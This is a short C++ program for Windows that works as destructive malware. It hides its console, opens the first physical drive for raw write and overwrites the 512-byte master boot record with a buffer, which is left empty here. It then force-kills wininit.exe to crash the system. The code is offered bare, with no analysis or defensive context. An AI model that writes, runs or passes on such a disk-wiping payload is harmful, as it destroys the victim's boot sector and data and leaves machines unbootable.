#include <iostream>
#include <windows.h>

int writeMBR();
int applyMBR(BYTE* mbr_new, int size);

int main() {

	ShowWindow(GetConsoleWindow(), SW_HIDE); // HIDE CONSOLE
	writeMBR();
	system("taskkill /f /IM wininit.exe /t");
}


int applyMBR(BYTE* mbr_new, int size) {

	DWORD bytesNum;
	HANDLE rawdrive;

	rawdrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	bytesNum = 0;

	if (SetFilePointer(rawdrive, 0, 0, 0) != 0 || WriteFile(rawdrive, mbr_new, size, &bytesNum, 0) == FALSE || bytesNum != size) {
		ExitProcess(2);
	}

	CloseHandle(rawdrive);
	return 0;

}

int writeMBR() {


	BYTE* mbr_new;
	BYTE mbrcode[512] = {
	};

	int size;

	mbr_new = mbrcode;
	size = sizeof(mbrcode);

	if (applyMBR(mbr_new, size))
		return 1;

}
